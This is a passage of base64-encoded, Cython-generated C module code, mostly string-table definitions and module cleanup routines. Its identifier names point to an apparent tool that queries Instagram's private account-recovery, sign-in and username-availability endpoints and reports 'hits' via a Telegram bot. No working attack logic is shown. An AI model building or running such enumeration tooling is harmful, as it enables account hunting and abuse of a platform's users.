mdfdGFiWzIzNl0KI2RlZmluZSBfX3B5eF9uX3VfaWQgX19weXhfc3RyaW5nX3RhYlsyMzddCiNkZWZpbmUgX19weXhfbl91X2lnIF9fcHl4X3N0cmluZ190YWJbMjM4XQojZGVmaW5lIF9fcHl4X25fdV9pZzEgX19weXhfc3RyaW5nX3RhYlsyMzldCiNkZWZpbmUgX19weXhfbl91X2lnMiBfX3B5eF9zdHJpbmdfdGFiWzI0MF0KI2RlZmluZSBfX3B5eF9uX3VfaWczIF9fcHl4X3N0cmluZ190YWJbMjQxXQojZGVmaW5lIF9fcHl4X25fdV9pZzQgX19weXhfc3RyaW5nX3RhYlsyNDJdCiNkZWZpbmUgX19weXhfbl91X2lnNSBfX3B5eF9zdHJpbmdfdGFiWzI0M10KI2RlZmluZSBfX3B5eF9uX3VfaWdfc2lnX2tleV92ZXJzaW9uIF9fcHl4X3N0cmluZ190YWJbMjQ0XQojZGVmaW5lIF9fcHl4X25fdV9pbXBvcnRsaWIgX19weXhfc3RyaW5nX3RhYlsyNDVdCiNkZWZpbmUgX19weXhfbl91X2luZm9fdGV4dCBfX3B5eF9zdHJpbmdfdGFiWzI0Nl0KI2RlZmluZSBfX3B5eF9uX3VfaW5mb2luc3RhIF9fcHl4X3N0cmluZ190YWJbMjQ3XQojZGVmaW5lIF9fcHl4X25fdV9pbml0IF9fcHl4X3N0cmluZ190YWJbMjQ4XQojZGVmaW5lIF9fcHl4X25fdV9pbml0aWFsaXppbmcgX19weXhfc3RyaW5nX3RhYlsyNDldCiNkZWZpbmUgX19weXhfbl91X2lubGluZV9rZXlib2FyZCBfX3B5eF9zdHJpbmdfdGFiWzI1MF0KI2RlZmluZSBfX3B5eF9uX3VfaW5wdXQgX19weXhfc3RyaW5nX3RhYlsyNTFdCiNkZWZpbmUgX19weXhfbl91X2luc3RhZ3JhbV9yZWNvdmVyeV91cmwgX19weXhfc3RyaW5nX3RhYlsyNTJdCiNkZWZpbmUgX19weXhfbl91X2lzX2Nvcm91dGluZSBfX3B5eF9zdHJpbmdfdGFiWzI1M10KI2RlZmluZSBfX3B5eF9rcF91X2lzZW5hYmxlZCBfX3B5eF9zdHJpbmdfdGFiWzI1NF0KI2RlZmluZSBfX3B5eF9uX3VfanNvbiBfX3B5eF9zdHJpbmdfdGFiWzI1NV0KI2RlZmluZSBfX3B5eF9uX3VfayBfX3B5eF9zdHJpbmdfdGFiWzI1Nl0KI2RlZmluZSBfX3B5eF9rcF91X2tlZXBfYWxpdmUgX19weXhfc3RyaW5nX3RhYlsyNTddCiNkZWZpbmUgX19weXhfbl91X2tleWJvYXJkIF9fcHl4X3N0cmluZ190YWJbMjU4XQojZGVmaW5lIF9fcHl4X25fdV9sb2dvIF9fcHl4X3N0cmluZ190YWJbMjU5XQojZGVmaW5lIF9fcHl4X25fdV9sc2QgX19weXhfc3RyaW5nX3RhYlsyNjBdCiNkZWZpbmUgX19weXhfa3BfdV9tX2F3X3B5IF9fcHl4X3N0cmluZ190YWJbMjYxXQojZGVmaW5lIF9fcHl4X25fdV9tYWluIF9fcHl4X3N0cmluZ190YWJbMjYyXQojZGVmaW5lIF9fcHl4X25fdV9tYXRjaCBfX3B5eF9zdHJpbmdfdGFiWzI2M10KI2RlZmluZSBfX3B5eF9uX3VfbWQ1IF9fcHl4X3N0cmluZ190YWJbMjY0XQojZGVmaW5lIF9fcHl4X2twX3VfbWlkX1pWZkd2Z0FCQUFHb1FxYTdBWTNtZ29ZQlYxblAgX19weXhfc3RyaW5nX3RhYlsyNjVdCiNkZWZpbmUgX19weXhfbl91X21vZHVsZSBfX3B5eF9zdHJpbmdfdGFiWzI2Nl0KI2RlZmluZSBfX3B5eF9uX3VfbiBfX3B5eF9zdHJpbmdfdGFiWzI2N10KI2RlZmluZSBfX3B5eF9uX3VfbjEgX19weXhfc3RyaW5nX3RhYlsyNjhdCiNkZWZpbmUgX19weXhfbl91X24yIF9fcHl4X3N0cmluZ190YWJbMjY5XQojZGVmaW5lIF9fcHl4X25fdV9uYW1lIF9fcHl4X3N0cmluZ190YWJbMjcwXQojZGVmaW5lIF9fcHl4X25fdV9uZXh0IF9fcHl4X3N0cmluZ190YWJbMjcxXQojZGVmaW5lIF9fcHl4X2twX3Vfbm9fcmVzZXQgX19weXhfc3RyaW5nX3RhYlsyNzJdCiNkZWZpbmUgX19weXhfa3BfdV9udWxsIF9fcHl4X3N0cmluZ190YWJbMjczXQojZGVmaW5lIF9fcHl4X2twX3VfbnVsbF9udWxsX251bGxfbnVsbF9udWxsX05MX251bCBfX3B5eF9zdHJpbmdfdGFiWzI3NF0KI2RlZmluZSBfX3B5eF9uX3Vfb3BlbiBfX3B5eF9zdHJpbmdfdGFiWzI3NV0KI2RlZmluZSBfX3B5eF9uX3Vfb3JpZ2luIF9fcHl4X3N0cmluZ190YWJbMjc2XQojZGVmaW5lIF9fcHl4X25fdV9vcmlnaW5faGVhZGVyIF9fcHl4X3N0cmluZ190YWJbMjc3XQojZGVmaW5lIF9fcHl4X25fdV9vcyBfX3B5eF9zdHJpbmdfdGFiWzI3OF0KI2RlZmluZSBfX3B5eF9uX3VfcGFyYW1zIF9fcHl4X3N0cmluZ190YWJbMjc5XQojZGVmaW5lIF9fcHl4X25fdV9wYXJzZV9tb2RlIF9fcHl4X3N0cmluZ190YWJbMjgwXQojZGVmaW5lIF9fcHl4X25fdV9wayBfX3B5eF9zdHJpbmdfdGFiWzI4MV0KI2RlZmluZSBfX3B5eF9uX3VfcG9wIF9fcHl4X3N0cmluZ190YWJbMjgyXQojZGVmaW5lIF9fcHl4X25fdV9wb3N0IF9fcHl4X3N0cmluZ190YWJbMjgzXQojZGVmaW5lIF9fcHl4X25fdV9wcCBfX3B5eF9zdHJpbmdfdGFiWzI4NF0KI2RlZmluZSBfX3B5eF9uX3VfcHBwcCBfX3B5eF9zdHJpbmdfdGFiWzI4NV0KI2RlZmluZSBfX3B5eF9uX3VfcHJpbnQgX19weXhfc3RyaW5nX3RhYlsyODZdCiNkZWZpbmUgX19weXhfbl91X3B5ZmlnbGV0IF9fcHl4X3N0cmluZ190YWJbMjg3XQojZGVmaW5lIF9fcHl4X25fdV9xdWFsbmFtZSBfX3B5eF9zdHJpbmdfdGFiWzI4OF0KI2RlZmluZSBfX3B5eF9uX3VfcXVlcnkgX19weXhfc3RyaW5nX3RhYlsyODldCiNkZWZpbmUgX19weXhfbl91X3IgX19weXhfc3RyaW5nX3RhYlsyOTBdCiNkZWZpbmUgX19weXhfbl91X3JhbmRvbSBfX3B5eF9zdHJpbmdfdGFiWzI5MV0KI2RlZmluZSBfX3B5eF9uX3VfcmFuZHJhbmdlIF9fcHl4X3N0cmluZ190YWJbMjkyXQojZGVmaW5lIF9fcHl4X25fdV9yYW5nZSBfX3B5eF9zdHJpbmdfdGFiWzI5M10KI2RlZmluZSBfX3B5eF9uX3VfcmUgX19weXhfc3RyaW5nX3RhYlsyOTRdCiNkZWZpbmUgX19weXhfbl91X3JlYWQgX19weXhfc3RyaW5nX3RhYlsyOTVdCiNkZWZpbmUgX19weXhfbl91X3JlY292ZXJ5X3VybCBfX3B5eF9zdHJpbmdfdGFiWzI5Nl0KI2RlZmluZSBfX3B5eF9uX3VfcmVmZXJlciBfX3B5eF9zdHJpbmdfdGFiWzI5N10KI2RlZmluZSBfX3B5eF9uX3VfcmVmZXJyZXJfaGVhZGVyIF9fcHl4X3N0cmluZ190YWJbMjk4XQojZGVmaW5lIF9fcHl4X25fdV9yZWdfZGF0ZSBfX3B5eF9zdHJpbmdfdGFiWzI5OV0KI2RlZmluZSBfX3B5eF9uX3VfcmVuZGVyIF9fcHl4X3N0cmluZ190YWJbMzAwXQojZGVmaW5lIF9fcHl4X25fdV9yZW5kZXJfc3VyZmFjZSBfX3B5eF9zdHJpbmdfdGFiWzMwMV0KI2RlZmluZSBfX3B5eF9uX3VfcmVwbHlfbWFya3VwIF9fcHl4X3N0cmluZ190YWJbMzAyXQojZGVmaW5lIF9fcHl4X25fdV9yZXF1ZXN0cyBfX3B5eF9zdHJpbmdfdGFiWzMwM10KI2RlZmluZSBfX3B5eF9uX3VfcmVzMSBfX3B5eF9zdHJpbmdfdGFiWzMwNF0KI2RlZmluZSBfX3B5eF9uX3VfcmVzcG9uc2UgX19weXhfc3RyaW5nX3RhYlszMDVdCiNkZWZpbmUgX19weXhfbl91X3Jlc3QgX19weXhfc3RyaW5nX3RhYlszMDZdCiNkZWZpbmUgX19weXhfa3BfdV9yZXN0X2Vycm9yX2luX2Z1bmN0aW9uIF9fcHl4X3N0cmluZ190YWJbMzA3XQojZGVmaW5lIF9fcHl4X25fdV9zYXkgX19weXhfc3RyaW5nX3RhYlszMDhdCiNkZWZpbmUgX19weXhfbl91X3NlYXJjaCBfX3B5eF9zdHJpbmdfdGFiWzMwOV0KI2RlZmluZSBfX3B5eF9uX3Vfc2VuZCBfX3B5eF9zdHJpbmdfdGFiWzMxMF0KI2RlZmluZSBfX3B5eF9rcF91X3NlbmRNZXNzYWdlIF9fcHl4X3N0cmluZ190YWJbMzExXQojZGVmaW5lIF9fcHl4X25fdV9zZXNzaW9uIF9fcHl4X3N0cmluZ190YWJbMzEyXQojZGVmaW5lIF9fcHl4X25fdV9zZXRfbmFtZSBfX3B5eF9zdHJpbmdfdGFiWzMxM10KI2RlZmluZSBfX3B5eF9uX3Vfc2lnbmVkX2JvZHkgX19weXhfc3RyaW5nX3RhYlszMTRdCiNkZWZpbmUgX19weXhfa3BfdV9zaWduaW5fdjJfdXNlcm5hbWVyZWNvdmVyeV9mbG93IF9fcHl4X3N0cmluZ190YWJbMzE1XQojZGVmaW5lIF9fcHl4X2twX3Vfc2lnbnVwX3VzZXJuYW1lYXZhaWxhYmlsaXR5IF9fcHl4X3N0cmluZ190YWJbMzE2XQojZGVmaW5lIF9fcHl4X2twX3Vfc2lnbnVwX3ZhbGlkYXRlcGVyc29uYWxkZXRhaWwgX19weXhfc3RyaW5nX3RhYlszMTddCiNkZWZpbmUgX19weXhfbl91X3NsZWVwIF9fcHl4X3N0cmluZ190YWJbMzE4XQojZGVmaW5lIF9fcHl4X25fdV9zcGFjZSBfX3B5eF9zdHJpbmdfdGFiWzMxOV0KI2RlZmluZSBfX3B5eF9uX3Vfc3BlYyBfX3B5eF9zdHJpbmdfdGFiWzMyMF0KI2RlZmluZSBfX3B5eF9uX3Vfc3BsaXQgX19weXhfc3RyaW5nX3RhYlszMjFdCiNkZWZpbmUgX19weXhfbl91X3NwbGl0bGluZXMgX19weXhfc3RyaW5nX3RhYlszMjJdCiNkZWZpbmUgX19weXhfbl91X3N0YXJ0IF9fcHl4X3N0cmluZ190YWJbMzIzXQojZGVmaW5lIF9fcHl4X25fdV9zdGF0c19saW5lIF9fcHl4X3N0cmluZ190YWJbMzI0XQojZGVmaW5lIF9fcHl4X25fdV9zdGF0c19sb29wIF9fcHl4X3N0cmluZ190YWJbMzI1XQojZGVmaW5lIF9fcHl4X25fdV9zdGRvdXQgX19weXhfc3RyaW5nX3RhYlszMjZdCiNkZWZpbmUgX19weXhfbl91X3N0cmluZyBfX3B5eF9zdHJpbmdfdGFiWzMyN10KI2RlZmluZSBfX3B5eF9uX3Vfc3VicHJvY2VzcyBfX3B5eF9zdHJpbmdfdGFiWzMyOF0KI2RlZmluZSBfX3B5eF9uX3Vfc3lzIF9fcHl4X3N0cmluZ190YWJbMzI5XQojZGVmaW5lIF9fcHl4X25fdV9zeXN0ZW0gX19weXhfc3RyaW5nX3RhYlszMzBdCiNkZWZpbmUgX19weXhfbl91X3RhcmdldCBfX3B5eF9zdHJpbmdfdGFiWzMzMV0KI2RlZmluZSBfX3B5eF9uX3VfdGVzdCBfX3B5eF9zdHJpbmdfdGFiWzMzMl0KI2RlZmluZSBfX3B5eF9uX3VfdGV4dCBfX3B5eF9zdHJpbmdfdGFiWzMzM10KI2RlZmluZSBfX3B5eF9uX3VfdGhyZWFkaW5nIF9fcHl4X3N0cmluZ190YWJbMzM0XQojZGVmaW5lIF9fcHl4X25fdV90aHJvdyBfX3B5eF9zdHJpbmdfdGFiWzMzNV0KI2RlZmluZSBfX3B5eF9uX3VfdGltZSBfX3B5eF9zdHJpbmdfdGFiWzMzNl0KI2RlZmluZSBfX3B5eF9uX3VfdGluZm8gX19weXhfc3RyaW5nX3RhYlszMzddCiNkZWZpbmUgX19weXhfbl91X3RsIF9fcHl4X3N0cmluZ190YWJbMzM4XQojZGVmaW5lIF9fcHl4X2twX3VfdGxfdHh0IF9fcHl4X3N0cmluZ190YWJbMzM5XQojZGVmaW5lIF9fcHl4X25fdV90bG4gX19weXhfc3RyaW5nX3RhYlszNDBdCiNkZWZpbmUgX19weXhfbl91X3RvayBfX3B5eF9zdHJpbmdfdGFiWzM0MV0KI2RlZmluZSBfX3B5eF9uX3VfdG9rZW5fZGF0YSBfX3B5eF9zdHJpbmdfdGFiWzM0Ml0KI2RlZmluZSBfX3B5eF9uX3VfdG9rZW5fZmlsZSBfX3B5eF9zdHJpbmdfdGFiWzM0M10KI2RlZmluZSBfX3B5eF9uX3VfdG9rZW5fbGluZSBfX3B5eF9zdHJpbmdfdGFiWzM0NF0KI2RlZmluZSBfX3B5eF9uX3VfdG90YWxfaGl0cyBfX3B5eF9zdHJpbmdfdGFiWzM0NV0KI2RlZmluZSBfX3B5eF9uX3VfdWEgX19weXhfc3RyaW5nX3RhYlszNDZdCiNkZWZpbmUgX19weXhfbl91X3VwZGF0ZV9zdGF0cyBfX3B5eF9zdHJpbmdfdGFiWzM0N10KI2RlZmluZSBfX3B5eF9uX3VfdXJsIF9fcHl4X3N0cmluZ190YWJbMzQ4XQojZGVmaW5lIF9fcHl4X25fdV91c2VyIF9fcHl4X3N0cmluZ190YWJbMzQ5XQojZGVmaW5lIF9fcHl4X25fdV91c2VyX2FnZW50IF9fcHl4X3N0cmluZ190YWJbMzUwXQojZGVmaW5lIF9fcHl4X25fdV91c2VyX2FnZW50X2hlYWRlciBfX3B5eF9zdHJpbmdfdGFiWzM1MV0KI2RlZmluZSBfX3B5eF9uX3VfdXNlcl9pZCBfX3B5eF9zdHJpbmdfdGFiWzM1Ml0KI2RlZmluZSBfX3B5eF9uX3VfdXNlcl9pZF9pbnQgX19weXhfc3RyaW5nX3RhYlszNTNdCiNkZWZpbmUgX19weXhfbl91X3VzZXJuYW1lIF9fcHl4X3N0cmluZ190YWJbMzU0XQojZGVmaW5lIF9fcHl4X25fdV91dWkgX19weXhfc3RyaW5nX3RhYlszNTVdCiNkZWZpbmUgX19weXhfbl91X3V1aWQgX19weXhfc3RyaW5nX3RhYlszNTZdCiNkZWZpbmUgX19weXhfbl91X3V1aWQ0IF9fcHl4X3N0cmluZ190YWJbMzU3XQojZGVmaW5lIF9fcHl4X25fdV92YWx1ZSBfX3B5eF9zdHJpbmdfdGFiWzM1OF0KI2RlZmluZSBfX3B5eF9uX3VfdmFyaWFibGVzIF9fcHl4X3N0cmluZ190YWJbMzU5XQojZGVmaW5lIF9fcHl4X25fdV93IF9fcHl4X3N0cmluZ190YWJbMzYwXQojZGVmaW5lIF9fcHl4X25fdV93aGl0ZSBfX3B5eF9zdHJpbmdfdGFiWzM2MV0KI2RlZmluZSBfX3B5eF9uX3Vfd3JpdGUgX19weXhfc3RyaW5nX3RhYlszNjJdCiNkZWZpbmUgX19weXhfbl91X3llbCBfX3B5eF9zdHJpbmdfdGFiWzM2M10KI2RlZmluZSBfX3B5eF9uX3VfeWVsMSBfX3B5eF9zdHJpbmdfdGFiWzM2NF0KI2RlZmluZSBfX3B5eF9uX3VfeWVsMiBfX3B5eF9zdHJpbmdfdGFiWzM2NV0KI2RlZmluZSBfX3B5eF9uX3VfeWVsMyBfX3B5eF9zdHJpbmdfdGFiWzM2Nl0KI2RlZmluZSBfX3B5eF9uX3VfeWVsNCBfX3B5eF9zdHJpbmdfdGFiWzM2N10KI2RlZmluZSBfX3B5eF9uX3VfeWVsNSBfX3B5eF9zdHJpbmdfdGFiWzM2OF0KCiNpZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURQpzdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fcHl4X21fY2xlYXIoUHlPYmplY3QgKm0pIHsKICBfX3B5eF9tc3RhdGV0eXBlICpjbGVhcl9tb2R1bGVfc3RhdGUgPSBfX1B5eF9QeU1vZHVsZV9HZXRTdGF0ZShtKTsKICBpZiAoIWNsZWFyX21vZHVsZV9zdGF0ZSkgcmV0dXJuIDA7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9kKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2IpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfY3l0aG9uX3J1bnRpbWUpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfZW1wdHlfdHVwbGUpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfZW1wdHlfYnl0ZXMpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfZW1wdHlfdW5pY29kZSk7CiAgI2lmZGVmIF9fUHl4X0N5RnVuY3Rpb25fVVNFRAogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfQ3lGdW5jdGlvblR5cGUpOwogICNlbmRpZgogICNpZmRlZiBfX1B5eF9GdXNlZEZ1bmN0aW9uX1VTRUQKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X0Z1c2VkRnVuY3Rpb25UeXBlKTsKICAjZW5kaWYKICAjaWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUCiAgX19QeXhfU3RhdGVfUmVtb3ZlTW9kdWxlKE5VTEwpOwogICNlbmRpZgogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfcHR5cGVfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF9fR2hvc3QpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfdHlwZV8yYXdfX19weXhfc2NvcGVfc3RydWN0X19HaG9zdCk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9wdHlwZV8yYXdfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcik7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF90eXBlXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X3B0eXBlXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X3R5cGVfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfcHR5cGVfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfdHlwZV8yYXdfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcik7CiAgZm9yIChpbnQgaT0wOyBpPDE7ICsraSkgeyBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X3NsaWNlW2ldKTsgfQogIGZvciAoaW50IGk9MDsgaTwxMDsgKytpKSB7IFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfdHVwbGVbaV0pOyB9CiAgZm9yIChpbnQgaT0wOyBpPDEzOyArK2kpIHsgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9jb2Rlb2JqX3RhYltpXSk7IH0KICBmb3IgKGludCBpPTA7IGk8MzY5OyArK2kpIHsgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9zdHJpbmdfdGFiW2ldKTsgfQogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfZmxvYXRfMF8wMjAwKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8wKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8zKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF82KTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF85KTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xNSk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTYpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzMwKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8zMik7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfNDApOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMTApOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMTEpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMTIpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMTMpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMTQpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMTUpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMTYpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMTcpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMTgpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMTkpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMjApOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMjEpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMjIpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMjMpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzEyNzg4ODkpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzEyNzkwMDApOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzE3NzUwMDAwKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xNzc1MDAwMSk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjc5NzYwMDAwKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yNzk3NjAwMDEpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzkwMDk5MDAwMCk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfOTAwOTkwMDAxKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xNjI5MDEwMDAwKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xNjI5MDEwMDAxKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMzY5MzU5NzYxKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMzY5MzU5NzYyKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF80MjM5NTE2NzU0KTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF80MjM5NTE2NzU1KTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF82MzQ1MTA4MjA5KTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF82MzQ1MTA4MjEwKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xMDAxNjIzMjM5NSk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTAwMTYyMzIzOTYpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzI3MjM4NjAyMTU5KTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yNzIzODYwMjE2MCk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfNDM0NjQ0NzUzOTUpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzQzNDY0NDc1Mzk2KTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF81MDI4OTI5NzY0Nyk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfNTAyODkyOTc2NDgpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzU3NDY0NzA3MDgyKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF81NzQ2NDcwNzA4Myk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfNjMzMTM0MjY5MzgpOwogIHJldHVybiAwOwp9CiNlbmRpZgoKI2lmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFCnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19weXhfbV90cmF2ZXJzZShQeU9iamVjdCAqbSwgdmlzaXRwcm9jIHZpc2l0LCB2b2lkICphcmcpIHsKICBfX3B5eF9tc3RhdGV0eXBlICp0cmF2ZXJzZV9tb2R1bGVfc3RhdGUgPSBfX1B5eF9QeU1vZHVsZV9HZXRTdGF0ZShtKTsKICBpZiAoIXRyYXZlcnNlX21vZHVsZV9zdGF0ZSkgcmV0dXJuIDA7CiAgUHlfVklTSVQodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9kKTsKICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2IpOwogIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfY3l0aG9uX3J1bnRpbWUpOwogIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfZW1wdHlfdHVwbGUpOwogIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfZW1wdHlfYnl0ZXMpOwogIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfZW1wdHlfdW5pY29kZSk7CiAgI2lmZGVmIF9fUHl4X0N5RnVuY3Rpb25fVVNFRAogIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfQ3lGdW5jdGlvblR5cGUpOwogICNlbmRpZgogICNpZmRlZiBfX1B5eF9GdXNlZEZ1bmN0aW9uX1VTRUQKICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X0Z1c2VkRnVuY3Rpb25UeXBlKTsKICAjZW5kaWYKICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X3B0eXBlXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfX0dob3N0KTsKICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X3R5cGVfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF9fR2hvc3QpOwogIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfcHR5cGVfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIpOwogIFB5X1ZJU0